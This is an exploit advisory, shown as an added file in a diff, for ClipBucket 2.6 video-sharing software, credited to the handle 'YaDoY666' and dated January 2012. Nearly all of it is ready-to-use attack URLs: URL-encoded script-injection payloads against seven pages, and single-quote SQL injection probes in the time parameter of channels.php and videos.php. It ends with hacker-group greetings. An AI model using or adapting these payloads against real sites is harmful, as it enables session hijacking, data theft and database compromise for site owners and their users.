@@ -1,0 +1,41 @@
+#	Exploit			: Multiple Vulnerability on ClipBucket 2.6
+#	Date 			: 09 January 2012
+#	Author			: YaDoY666
+#	Website			: http://yadoy666.serverisdown.org
+#	Software		: Clip Bucket (Open Source Video Sharing)
+#	Version			: 2.6 
+#	Vendor			: Clip Bucket (http://clip-bucket.com)
+#	Vendor Response	: None
+
+Cross Site Scripting
+====================
+
+[[=]]	http://[site]/[path]/channels.php
+[[=]]	http://[site]/[path]/collections.php
+[[=]]	http://[site]/[path]/groups.php
+[[=]]	http://[site]/[path]/search_result.php
+[[=]]	http://[site]/[path]/videos.php
+[[=]]	http://[site]/[path]/view_collection.php
+[[=]]	http://[site]/[path]/view_item.php
+
+Example :
+http://[site]/[path]/channels.php?cat=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E&seo_cat_name=&sort=most_recent&time=all_time
+http://[site]/[path]/collections.php?cat=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E&seo_cat_name=&sort=most_recent&time=all_time
+http://[site]/[path]/groups.php?cat=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E&seo_cat_name=&sort=most_recent&time=all_time
+http://[site]/[path]/search_result.php?query=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E&submit=Search&type=
+http://[site]/[path]/videos.php?cat=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E&seo_cat_name=&sort=most_recent&time=all_time
+http://[site]/[path]/view_collection.php?cid=9&type=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E
+http://[site]/[path]/view_item.php?collection=9&item=KWSWG7S983SY&type=%27%22%28%29%26%251%3CScRiPt%20%3Ealert%28%27YaDoY666%20Was%20Here%27%29%3C%2fScRiPt%3E
+
+SQL Injection
+==============
+
+[[=]]	http://[site]/[path]/channels.php
+[[=]]	http://[site]/[path]/videos.php
+
+Example :
+http://[site]/[path]/videos.php?cat=all&seo_cat_name=&sort=most_recent&time=1%27
+http://[site]/[path]/channels.php?cat=all&seo_cat_name=&sort=most_recent&time=1%27
+
+
+Greets : KombezNux | Jack | X-Shadow | Don Tukulesto | GBlack | elv1n4 | GBlack | Kamtiez | n4ck0 | AaEzha | ServerIsDown | Indonesian Coder |
